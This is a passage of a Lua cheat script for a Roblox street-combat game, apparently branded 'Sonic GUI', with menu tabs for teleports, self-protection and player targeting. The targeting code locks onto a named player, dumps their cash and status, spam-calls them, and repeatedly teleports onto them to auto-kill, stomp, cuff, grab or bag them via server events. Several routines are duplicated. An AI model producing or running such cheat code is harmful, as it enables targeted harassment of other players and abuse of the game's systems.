        end
    })
end

--Teleport Tab--
local TeleportTab = Window:MakeTab({
	Name = "Teleports",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

TeleportTab:AddButton({
	Name = "Bank",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-438.689, 39.0127, -284.731)
	end
})

TeleportTab:AddButton({
	Name = "Food Shop [Bank]",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-335.141, 23.7129, -298.029)
	end
})

TeleportTab:AddButton({
	Name = "Food Shop [Uphill",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(298.477, 49.3129, -615.231)
	end
})

TeleportTab:AddButton({
	Name = "Food Shop [Taco]",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(583.96, 51.0917, -479.596)
	end
})

TeleportTab:AddButton({
	Name = "Food Shop [Hamburger]",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-279.501, 22.6801, -803.887)
	end
})


TeleportTab:AddButton({
	Name = "Gun Shop [Uphill]",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.925, 48.1008, -621.23)
	end
})


TeleportTab:AddButton({
	Name = "Gun Shop [Downhill]",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-580.27, 8.34504, -734.832)
	end
})


TeleportTab:AddButton({
	Name = "Police Station",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-263.919, 21.8302, -112.858)
	end
})

TeleportTab:AddButton({
	Name = "Fire Department",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-129.534, 27.842, -113.062)
	end
})

TeleportTab:AddButton({
	Name = "Church",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(205.53, 21.7803, -80.2361)
	end
})

TeleportTab:AddButton({
	Name = "Casino",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-904.457, 24.7803, -156.994)
	end
})

local ProtectTab = Window:MakeTab({
	Name = "Protection",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

ProtectTab:AddToggle({
    Name = "Anti Autokill",
    Default = false,
    Callback = function(bool)
        if bool then
			Notif("Anti Autokill Enabled!", 5)
			game:GetService('RunService'):BindToRenderStep("Anti-Autokill", 0 , function()
             wait(0.01)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 0)
            end)
        elseif bool == false then -- Заменил "=" на "=="
		    game:GetService('RunService'):UnbindFromRenderStep("Anti-Autokill")
        end
    end
})

ProtectTab:AddToggle({
	Name = "Anti Stomp",
	Default = false,
	Callback = function(x)
		if x == true then
			game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
				if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
					for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
						if v:IsA('MeshPart') or v:IsA('Part') then
							v:Destroy()
						end
					end
					for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
						if v:IsA('Accessory') then
							v.Handle:Destroy()
						end
					end
				end
			end)
		elseif x == false then
			game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
		end
	end
})


local TargetTab = Window:MakeTab({
	Name = "Target",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local locktarget = ""

TargetTab:AddTextbox({
    Name = "Username (Not Display Name)",
    Default = "",
    TextDisappear = false,
    Callback = function(val)
        -- Checks if the box doesn't have any text so it doesn't bug and target random person
        if val == "" then
            return
        end
         locktarget = findtarget(val)
        OrionLib:MakeNotification({
            Name = "Sonic GUI",
            Content = "Target: " ..locktarget,
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

TargetTab:AddButton({
	Name = "Goto",
	Callback = function()
		if game.Players:FindFirstChild(locktarget) then
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[locktarget].Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 2)
		 elseif not game.Players:FindFirstChild(locktarget) then
			OrionLib:MakeNotification({
				Name = "Sonic GUI",
				Content = "Player not found",
				Image = "rbxassetid://4483345998",
				Time = 5
			})
		end
	 end
})

TargetTab:AddButton({
	Name = "Info",
	Callback = function()
    Notif("We Send You Target Info In Console do /console to see target info")
        print("Sonic Gui: " .. "Player Username: " .. locktarget )
        print("Sonic Gui: " .. "Player Wanted: " .. game.Players[locktarget].DataFolder.Information.Wanted.Value )
        print("Sonic Gui: " .. "Player Cash: " .. game.Players[locktarget].DataFolder.Currency.Value .. "$" )
        print("Sonic Gui: " .. "Player Health: " .. game.Players[locktarget].Character.Humanoid.Health )
        if game.Players[locktarget].Character.BodyEffects.Armor.Value == 100 then
            print("Sonic Hub: " .. "Armor: " .. " Yes,Player Got Armor" )
        else
            if game.Players[locktarget].Character.BodyEffects.Armor.Value == 0 then
                print("Sonic Gui: " .. "Armor: " .. " No,Player Not Got Armor" )
            end
        end
        if game.Players[locktarget].Character.BodyEffects['K.O'].Value == true then
            print("Sonic Gui " .. "Player Status: " .. "Player Knocked" )
        else
            if game.Players[locktarget].Character.BodyEffects['K.O'].Value == false then
                print("Sonic Gui: " .. "Player Status: " .. "Player Not Knock" )
            end			
            print("Sonic Gui: " .. "Crew:" .. game:GetService("Players")[locktarget].DataFolder.Information.Crew.Value)
            if game:GetService("Players")[locktarget].DataFolder.Information.Crew.Value == "" then
                print("Sonic Gui: " .. "Player Not In Crew")
            end
            print("Sonic Gui: " .. "Player Tools: ")
            for i, v in pairs(game:GetService("Players")[locktarget].Backpack:GetDescendants()) do
                if v:IsA("Tool") then
                    print(""..v.Name.."")
                end
            end
        end
	 end
})

TargetTab:AddButton({
	Name = "Save",
	Callback = function()
        if game.Players[locktarget] then
            local targetPlayer = game.Players[locktarget]
            
            if targetPlayer.Character and targetPlayer.Character.BodyEffects and targetPlayer.Character.BodyEffects["K.O"] then
                if targetPlayer.Character.BodyEffects["K.O"].Value == true then
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPlayer.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                    wait(0.4)
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-484.67132568359, 41.499858856201, -100.71377563477))
                    wait(1.5)
                    game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                else
                    Notif("Player is not knocked.", 10)
                end
        else
            Notif("Player not found.", 10)
        end
    end 
end       
})




TargetTab:AddToggle({
    Name = "Mark Player",
    Default = false,
    Callback = function(bool)

        local function createMarker(parent)
            local marker = Instance.new("Part")
            marker.Size = Vector3.new(2, 2, 2) 
            marker.Shape = Enum.PartType.Ball
            marker.Color = Color3.fromRGB(0, 0, 255)
            marker.Transparency = 0.5
            marker.CanCollide = false
            marker.Anchored = true
            marker.Parent = parent
            return marker
        end

        local function updateMarkerPosition(targetPlayer)
            local marker = targetPlayer.Character:FindFirstChild("Marker")
            if marker then
                marker.Position = targetPlayer.Character.HumanoidRootPart.Position
            end
        end

        if bool then
            if game.Players:FindFirstChild(locktarget) then
                local targetPlayer = game.Players[locktarget]

                local marker = targetPlayer.Character:FindFirstChild("Marker")
                if not marker then
                    marker = createMarker(targetPlayer.Character)
                    marker.Name = "Marker"
                end
                updateMarkerPosition(targetPlayer)

                local connection
                connection = game:GetService("RunService").RenderStepped:Connect(function()
                    if game.Players:FindFirstChild(locktarget) then
                        local updatedTargetPlayer = game.Players[locktarget]
                        updateMarkerPosition(updatedTargetPlayer)
                    else
                        connection:Disconnect()
                    end
                end)

            end
        else
            if game.Players:FindFirstChild(locktarget) then
                local targetPlayer = game.Players[locktarget]
                local marker = targetPlayer.Character:FindFirstChild("Marker")
                if marker then
                    marker:Destroy()
                end
            end
        end
    end
})









TargetTab:AddToggle({
	Name = "View",
	Default = false,
	Callback = function(bool)
		if bool then -- daddy

			viewingplr = true
		   
		   game.Workspace.Camera.CameraSubject = game.Players[locktarget].Character.Humanoid;
		 
		   game.Players[locktarget].CharacterAdded:connect(function()
			   game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
			 wait(1)
			 if viewingplr == true then
			   game.Workspace.Camera.CameraSubject = game.Players[locktarget].Character.Humanoid;
			 end
		   end)

		else
      
      viewingplr = false
game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
		end
	end
})

calltarget = false

TargetTab:AddToggle({
	Name = "Spam Call",
	Default = false,
	Callback = function(bool)
		if bool then

			calltarget = true
			while calltarget == true do
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
				wait()
				if game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]") then
					game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]").Parent = game.Players.LocalPlayer.Character
				end
				wait()
				game:GetService("ReplicatedStorage").MainEvent:FireServer("PhoneCall", locktarget)
				wait(.5)
			end
			  else
				calltarget = false
			  end
			end
})











-- Function to predict the movement of the target based on its current position and velocity
-- Function to predict the movement of the target based on its current position and velocity
local function predictMovement(target)
    local targetPosition = target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character.HumanoidRootPart.Position
    local predictedPosition = targetPosition
    
    if targetPosition then
        -- Calculate predicted position (example: assume constant speed and direction)
        predictedPosition = targetPosition + target.Character.HumanoidRootPart.Velocity * 0.5  -- Adjust prediction factor as needed
    end
    
    return predictedPosition
end

-- Function to perform autokill logic
local function performAutokill()
    local player = game.Players.LocalPlayer
    local target = game.Players:FindFirstChild(locktarget)

    if target and target.Character then
        local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
        
        if koValue and koValue.Value then
            -- Move to target's position underground
            local targetPosition = target.Character.UpperTorso.Position
            player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition.X, -50, targetPosition.Z)

            -- Perform stomp action
            game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            wait(1)

            -- Teleport back underground to a safe position after stomp
            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position)

            -- Freeze the player for 2 seconds
            player.Character.HumanoidRootPart.Anchored = true
            wait(2)
            player.Character.HumanoidRootPart.Anchored = false

            -- Move back to the target's position underground
            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position)
        end
    end
end



local isAutoKillRunning = false
local AutoKillCoroutine = nil


TargetTab:AddToggle({
    Name = "Autokill",
    Default = false,
    Callback = function(bool)
        if bool then
            if not isAutoKillRunning then
                isAutoKillRunning = true
                AutoKillCoroutine = coroutine.create(function()
                    while isAutoKillRunning do
                        wait()
                        performAutokill()

                        
                        local player = game.Players.LocalPlayer
                        local target = game.Players:FindFirstChild(locktarget)
                        
                        if target and target.Character then
                            local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                            
                            if koValue and not koValue.Value then
                                local combatItem = player.Backpack:FindFirstChild("Combat")
                                
                                if combatItem then
                                    combatItem.Parent = player.Character
                                end
                                
                                wait()
                                local combatTool = player.Character:FindFirstChild('Combat')
                                
                                if combatTool then
                                    combatTool:Activate()
                                end
                                
                                -- Predictive movement: move towards predicted position
                                local predictedPos = predictMovement(target)
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(predictedPos)
                            end
                        end
                    end
                end)
                coroutine.resume(AutoKillCoroutine)
            end
        else
            isAutoKillRunning = false
            if AutoKillCoroutine then
                coroutine.yield(AutoKillCoroutine)
                AutoKillCoroutine = nil
            end
            
            
            -- Restore the player's previous position
            local previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
            end
        end
    end
})








-- Function to predict future position based on current velocity and acceleration
local function PredictFuturePosition(character, timeAhead)
    local currentPosition = character.HumanoidRootPart.Position
    local currentVelocity = character.HumanoidRootPart.AssemblyLinearVelocity
    local acceleration = character.HumanoidRootPart.AssemblyLinearVelocity -- Using AssemblyLinearVelocity for accurate prediction
    
    -- Predict position using current velocity and acceleration
    local predictedPosition = currentPosition + currentVelocity * timeAhead + 0.5 * acceleration * timeAhead^2
    
    return predictedPosition
end



-- AddToggle function (assuming this is where your toggle logic resides)
-- Assuming TargetTab is defined appropriately and locktarget is updated based on your game logic

local previousPosition = nil
local follow = false
local noclip = false

TargetTab:AddToggle({
    Name = "Arrest",
    Default = false,
    Callback = function(bool)
        if bool then
            previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

            local function PredictFuturePosition(character, timeAhead)
                local currentPosition = character.HumanoidRootPart.Position
                local currentVelocity = character.HumanoidRootPart.AssemblyLinearVelocity
                local acceleration = character.HumanoidRootPart.AssemblyLinearVelocity -- Using AssemblyLinearVelocity for accurate prediction
                
                -- Predict position using current velocity and acceleration
                local predictedPosition = currentPosition + currentVelocity * timeAhead + 0.5 * acceleration * timeAhead^2
                
                return predictedPosition
            end
            
            repeat
                wait()
                local player = game.Players.LocalPlayer
                local target = game.Players[locktarget]
                
                if target and target.Character then
                    local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                    
                    if koValue and not koValue.Value then
                        -- Target is KO'd, initiate arrest process
                        local combatItem = player.Backpack:FindFirstChild("Combat") -- Assuming the tool is named "Combat"
                        
                        if combatItem then
                            combatItem.Parent = player.Character
                        end
                        
                        wait()
                        
                        local combatTool = player.Character:FindFirstChild('Combat') -- Assuming the tool is named "Combat"
                        
                        if combatTool then
                            combatTool:Activate()
                        end
                        
                        -- Predict target movement more accurately
                        local targetPosition = PredictFuturePosition(target.Character, 0.37) -- Predict 0.37 seconds ahead (adjust as needed)
                        
                        -- Move local player's character to predicted position
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            wait()
            
            repeat
                wait()
                local target = game.Players[locktarget]
                
                if target and target.Character and target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O") and target.Character.BodyEffects["K.O"].Value then
                    -- Additional logic for arrest when KO'd
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    
                    -- Activate cuff item
                    local cuffItem = game.Players.LocalPlayer.Backpack:FindFirstChild("Cuff")
                    if cuffItem then
                        cuffItem.Parent = game.Players.LocalPlayer.Character
                    end
                    wait(0.5)
                    local cuffTool = game.Players.LocalPlayer.Character:FindFirstChild('Cuff')
                    if cuffTool then
                        cuffTool:Activate()
                    end
                    wait(0.6)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and not game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            follow = true
            noclip = true
        else
            -- Disable arrest mode
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
                previousPosition = nil 
            end
        end
    end
})




-- Assuming TargetTab is defined appropriately and locktarget is updated based on your game logic


local previousPosition = nil
local follow = false
local noclip = false

TargetTab:AddToggle({
    Name = "Bring",
    Default = false,
    Callback = function(bool)
        if bool then
            previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            
            local function PredictFuturePosition(character, timeAhead)
                local currentPosition = character.HumanoidRootPart.Position
                local currentVelocity = character.HumanoidRootPart.AssemblyLinearVelocity
                local acceleration = character.HumanoidRootPart.AssemblyLinearVelocity -- Using AssemblyLinearVelocity for accurate prediction
                
                -- Predict position using current velocity and acceleration
                local predictedPosition = currentPosition + currentVelocity * timeAhead + 0.5 * acceleration * timeAhead^2
                
                return predictedPosition
            end
            
            repeat
                wait()
                local player = game.Players.LocalPlayer
                local target = game.Players[locktarget]
                
                if target and target.Character then
                    local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                    
                    if koValue and not koValue.Value then
                        -- Target is KO'd, initiate bringing process
                        local combatItem = player.Backpack:FindFirstChild("Combat") -- Assuming the tool is named "Combat"
                        
                        if combatItem then
                            combatItem.Parent = player.Character
                        end
                        
                        wait()
                        
                        local combatTool = player.Character:FindFirstChild('Combat') -- Assuming the tool is named "Combat"
                        
                        if combatTool then
                            combatTool:Activate()
                        end
                        
                        -- Predict target movement more accurately
                        local targetPosition = PredictFuturePosition(target.Character, 0.37) -- Predict 0.37 seconds ahead (adjust as needed)
                        
                        -- Move local player's character to predicted position
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            wait()
            
            repeat
                wait()
                local target = game.Players[locktarget]
                
                if target and target.Character and target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O") and target.Character.BodyEffects["K.O"].Value then
                    -- Additional logic for bringing when KO'd
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    
                    -- FireServer event for bringing action
                    game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
                    
                    wait(0.6)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and not game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            follow = true
            noclip = true
        else
            -- Disable bringing mode
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
                previousPosition = nil 
            end
        end
    end
})





local previousPosition = nil
local follow = false
local noclip = false

TargetTab:AddToggle({
    Name = "bag",
    Default = false,
    Callback = function(bool)
        if bool then
            buy("[BrownBag] - $27", "[BrownBag]", 27)
            wait(3)
            previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            
            local function PredictFuturePosition(character, timeAhead)
                local currentPosition = character.HumanoidRootPart.Position
                local currentVelocity = character.HumanoidRootPart.AssemblyLinearVelocity
                local acceleration = character.HumanoidRootPart.AssemblyLinearVelocity -- Using AssemblyLinearVelocity for accurate prediction
                
                -- Predict position using current velocity and acceleration
                local predictedPosition = currentPosition + currentVelocity * timeAhead + 0.5 * acceleration * timeAhead^2
                
                return predictedPosition
            end
            
            repeat
                wait()
                local player = game.Players.LocalPlayer
                local target = game.Players[locktarget]
                
                if target and target.Character then
                    local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                    
                    if koValue and not koValue.Value then
                        -- Target is KO'd, initiate bringing process
                        local combatItem = player.Backpack:FindFirstChild("Combat") -- Assuming the tool is named "Combat"
                        
                        if combatItem then
                            combatItem.Parent = player.Character
                        end
                        
                        wait()
                        
                        local combatTool = player.Character:FindFirstChild('Combat') -- Assuming the tool is named "Combat"
                        
                        if combatTool then
                            combatTool:Activate()
                        end
                        
                        -- Predict target movement more accurately
                        local targetPosition = PredictFuturePosition(target.Character, 0.37) -- Predict 0.37 seconds ahead (adjust as needed)
                        
                        -- Move local player's character to predicted position
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            wait()
            
            repeat
                wait()
                local target = game.Players[locktarget]
                
                if target and target.Character and target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O") and target.Character.BodyEffects["K.O"].Value then
                    -- Additional logic for bringing when KO'd
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(0.4)
                    
                    -- FireServer event for bringing action
                if game.Players.LocalPlayer.Backpack:FindFirstChild("[BrownBag]") then
                    game.Players.LocalPlayer.Backpack:FindFirstChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character
                    end
                    wait(.5)
                    game.Players.LocalPlayer.Character:FindFirstChild('[BrownBag]'):Activate()
                    
                    wait(0.6)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and not game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            follow = true
            noclip = true
        else
            -- Disable bringing mode
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
                previousPosition = nil 
            end
        end
    end
})












local isGunAutoKillRunning = false -- Track if GunAutoKill process is running
local follow = false -- Placeholder for follow logic
local noclip = false -- Placeholder for noclip logic

 
TargetTab:AddToggle({
    Name = "GunAutoKill",
    Default = false,
    Callback = function(bool)
        if bool then
            isGunAutoKillRunning = true -- Set to true when GunAutoKill starts
            
            while bool and isGunAutoKillRunning do
                wait()
                local player = game.Players.LocalPlayer
                local target = game.Players[locktarget]
                
                if target and target.Character then
                    local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                    
                    if koValue and not koValue.Value then
                        local combatItem = player.Backpack:FindFirstChild("[LMG]")
                        
                        if combatItem then
                            combatItem.Parent = player.Character
                        end
                        
                        wait()
                        local combatTool = player.Character:FindFirstChild('[LMG]')
                        
                        if combatTool then
                            combatTool:Activate()
                        end
                        
                        -- Calculate position relative to the target for circular motion
                        local circleCenter = target.Character.HumanoidRootPart.Position
                        local circleRadius = 10  -- Increase circle radius for faster circling
                        local angle = math.rad(tick() * 600)  -- Increase angular speed for faster circling
                        local offset = Vector3.new(math.cos(angle) * circleRadius, 5, math.sin(angle) * circleRadius)  -- Adjust vertical offset to target head level
                        local circlePosition = circleCenter + offset
                        
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(circlePosition, circleCenter)
                    end
                end
                
                if bool and isGunAutoKillRunning and game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and game.Players[locktarget].Character.BodyEffects["K.O"].Value then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[locktarget].Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(.4)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[locktarget].Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[locktarget].Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
                    wait(.4)
                    game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                    wait(.6)
                    
                    -- Move player to the desired location
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-129.534, 27.842, -113.062)
                    
                    -- Wait for a few seconds
                    wait(4)
                    
                    -- Return to the target
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
                end

                -- Optional: You can add follow and noclip settings here
                follow = true
                noclip = true
            end
        else
            isGunAutoKillRunning = false -- Reset when GunAutoKill is turned off
            -- Code to execute when the toggle is turned off
        end
    end
})





-- Function to predict future position based on current velocity
local function PredictFuturePosition(character, timeAhead)
    local currentPosition = character.HumanoidRootPart.Position
    local currentVelocity = character.HumanoidRootPart.Velocity
    local predictedPosition = currentPosition + currentVelocity * timeAhead
    return predictedPosition
end

-- AddToggle function (assuming this is where your toggle logic resides)
TargetTab:AddToggle({
    Name = "Arrest",
    Default = false,
    Callback = function(bool)
        if bool then
            previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            
            repeat
                wait()
                local player = game.Players.LocalPlayer
                local target = game.Players[locktarget]
                if target and target.Character then
                    local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                    if koValue and not koValue.Value then
                        -- Target is KO'd, initiate arrest process
                        local combatItem = player.Backpack:FindFirstChild("Combat") -- Assuming the tool is named "Combat"
                        if combatItem then
                            combatItem.Parent = player.Character
                        end
                        wait()
                        local combatTool = player.Character:FindFirstChild('Combat') -- Assuming the tool is named "Combat"
                        if combatTool then
                            combatTool:Activate()
                        end
                        
                        -- Predict target movement more accurately
                        local targetPosition = PredictFuturePosition(target.Character, 0.23) -- Predict 0.2 seconds ahead (adjust as needed)
                        
                        -- Move local player's character to predicted position
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            wait()
            repeat
                wait()
                local target = game.Players[locktarget]
                if target and target.Character and target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O") and target.Character.BodyEffects["K.O"].Value then
                    -- Additional logic for arrest when KO'd
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[locktarget].Character.UpperTorso.Position) * CFrame.new(0,1,0)
                    wait(.4)
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[locktarget].Character.UpperTorso.Position) * CFrame.new(0,1,0)
                    wait()
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[locktarget].Character.UpperTorso.Position) * CFrame.new(0,1,0)
                    wait(.4)
                    
                    -- Activate cuff item
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Cuff") then
                        game.Players.LocalPlayer.Backpack:FindFirstChild("Cuff").Parent = game.Players.LocalPlayer.Character
                    end
                    wait(.5)
                    game.Players.LocalPlayer.Character:FindFirstChild('Cuff'):Activate()
                    wait(.6)
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
                end
            until not bool or (game.Players[locktarget] and game.Players[locktarget].Character and game.Players[locktarget].Character:FindFirstChild("BodyEffects") and game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O") and not game.Players[locktarget].Character.BodyEffects["K.O"].Value)
            
            follow = true
            noclip = true
        else
            -- Disable arrest mode
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
                previousPosition = nil 
            end
        end
    end
})




local function predictMovement(target)
    local targetPosition = target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character.HumanoidRootPart.Position
    local predictedPosition = targetPosition
    
    if targetPosition then
        predictedPosition = targetPosition + target.Character.HumanoidRootPart.Velocity * 0.5  
    end
    
    return predictedPosition
end

-- Function to perform autokill logic
local function performKnifeAutokill()
    local player = game.Players.LocalPlayer
    local target = game.Players:FindFirstChild(locktarget)

    if target and target.Character then
        local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
        
        if koValue and koValue.Value then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
            wait(0.4)
            
